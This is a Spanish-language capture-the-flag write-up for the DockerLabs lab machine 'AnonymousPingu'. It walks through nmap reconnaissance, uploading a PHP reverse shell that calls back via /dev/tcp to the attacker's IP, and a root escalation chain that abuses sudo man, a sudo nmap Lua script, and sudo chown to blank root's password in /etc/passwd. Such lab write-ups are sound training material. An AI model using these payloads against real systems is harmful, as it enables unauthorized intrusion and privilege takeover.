#MAQUINA #DOCKERLABS #FACIL 
#ABUSO_SUBIDA_ARCHIVOS
#FTP_ANON
<hr>

# RECONOCIMIENTO

Vamos a resolver **AnonymousPingu** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 12:46 CET
Initiating ARP Ping Scan at 12:46
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:46, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:46
Scanning 172.17.0.2 [65535 ports]
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:46, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-11-25 12:46:29 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **21(FTP)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p21,80 172.17.0.2                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 12:47 CET
Nmap scan report for 172.17.0.2
Host is up (0.000024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
| -rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
| drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
| drwxr-xr-x    2 0        0            4096 Apr 28  2024 heustonn-html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
| -rw-r--r--    1 0        0           20162 Apr 28  2024 index.html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
| -rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
|_drwxrwxrwx    1 33       33           4096 Apr 28  2024 upload [NSE: writeable]
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Mantenimiento
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 12:48 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|_  /upload/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Podemos sacar dos cosas importantes:
+ El puerto **21 (FTP)** es vulnerable a **ftp-anon** -> entrar con usuario anonymous sin necesidad de poner contraseña.
+ En el puerto **80(HTTP)**, hay un directorio de **upload** que también hay en el directorio de FTP.

## FTP(21)

Al entrar con el usuario **anonymous**, podemos ver que podemos subir cosas.

# EXPLOTACION

Subimos una reverse shell en php:

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

Y nos ponemos en escucha:

   ```bash

nc -nlvp 443

```

Al entrar desde el servicio web al directorio upload y a la shell, como interpreta php, nos da una shell.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
www-data@4095cd4053b8:/var/www/html/upload$ sudo -l
Matching Defaults entries for www-data on 4095cd4053b8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on 4095cd4053b8:
    (pingu) NOPASSWD: /usr/bin/man

```

Vemos **man** con permisos SUDO para usuario pingu :
   ```bash
sudo -u pingu man man
!/bin/sh

```
YA ESTAMOS COMO PINGU

Vemos si el usuario tiene permisos SUDO:
   ```bash
pingu@4095cd4053b8:/var/www/html/upload$ sudo -l
Matching Defaults entries for pingu on 4095cd4053b8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User pingu may run the following commands on 4095cd4053b8:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpk

```

Vemos **nmap y dpk** con permisos SUDO para usuario gladys :
   ```bash
   
pingu@4095cd4053b8:/tmp$ echo 'os.execute("/bin/sh")' > ex 
pingu@4095cd4053b8:/tmp$ sudo -u gladys nmap --script=ex

```
YA ESTAMOS COMO GLADYS

Vemos si el usuario tiene permisos SUDO:
   ```bash
gladys@4095cd4053b8:/tmp$ sudo -l 
Matching Defaults entries for gladys on 4095cd4053b8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User gladys may run the following commands on 4095cd4053b8:
    (root) NOPASSWD: /usr/bin/chown


```

Vemos **chown** con permisos SUDO y vamos a modificar el /etc/passwd para entrar sin contraseña:

   ```bash
#Cambiamos permisos
sudo chown gladys:gladys /etc
sudo chown gladys:gladys /etc/passwd

# Definir las variables
var1="root:x:0:0:root:/root:/bin/bash"
var2="root::0:0:root:/root:/bin/bash"

# Realizar la sustitución y escribir el resultado en un archivo temporal
sed "s#$var1#$var2#" /etc/passwd > passwd_tmp

# Reemplazar el archivo original con el archivo temporal
mv passwd_tmp /etc/passwd

su root
```

**YA ESTAMOS COMO ROOT.**